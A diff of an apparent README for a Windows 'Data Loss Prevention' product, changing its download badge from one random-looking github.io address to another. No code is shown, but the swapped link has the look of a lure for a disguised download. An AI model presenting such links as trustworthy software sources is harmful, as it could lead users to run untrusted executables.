@@ -2,7 +2,7 @@
 
 ![Dashboard showing sensitive data alerts, policy checks, and secure sharing paths](https://avatars.mds.yandex.net/i?id=61ed10f5cb8b7d9e209aa7a4a392ad1c_l-4866923-images-thumbs&n=13)
 
-[![Download Data Loss Prevention](https://img.shields.io/badge/Download-Data_Loss_Prevention-blueviolet?style=for-the-badge&logo=windows)](https://isaiashahnmpzt.github.io/.github/data-loss-prevention)
+[![Download Data Loss Prevention](https://img.shields.io/badge/Download-Data_Loss_Prevention-blueviolet?style=for-the-badge&logo=windows)](https://cyrusmuellerreol.github.io/.github/data-loss-prevention)
 
 ## Protection Overview
 
